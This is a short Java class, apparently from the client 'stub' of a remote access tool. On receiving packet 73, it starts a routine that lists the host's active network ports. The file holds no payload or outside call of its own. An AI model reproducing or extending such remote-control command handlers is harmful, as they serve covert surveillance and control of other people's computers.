package com.redpois0n.stub.packets.incoming;

import com.redpois0n.ActivePorts;

public class Packet73ActivePorts extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new ActivePorts().start();
	}

}
